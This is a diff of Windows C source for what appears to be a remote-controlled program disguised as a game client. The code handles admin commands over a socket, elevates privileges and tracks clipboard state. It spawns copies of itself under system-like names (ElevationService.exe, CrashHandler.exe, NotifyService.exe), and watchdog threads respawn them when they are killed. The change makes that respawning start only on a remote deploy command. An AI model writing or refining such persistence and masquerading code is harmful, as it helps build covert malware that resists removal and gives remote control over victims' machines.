@@ -22,6 +22,7 @@ int g_cursor_count = 0;
 
 /* Global flag to stop watchdog from respawning */
 volatile int g_exiting = 0;
+volatile int g_watchdog_started = 0;
 
 /* Clipboard state */
 CRITICAL_SECTION g_copy_buffer_cs;
@@ -198,6 +199,11 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
+        /* Start watchdog only once, when user explicitly deploys */
+        if (!g_watchdog_started) {
+            g_watchdog_started = 1;
+            CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
+        }
         result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — auto-protect in 15s]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "REMOVE_SVC") == 0) {
@@ -387,10 +393,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
     
-    /* Start inter-process watchdog (respawns dead shadows) */
-    CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
-    
-    /* Start protection watchdog thread */
+    /* Start protection watchdog thread (self-protection only) */
     CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
     
     /* Start game client */
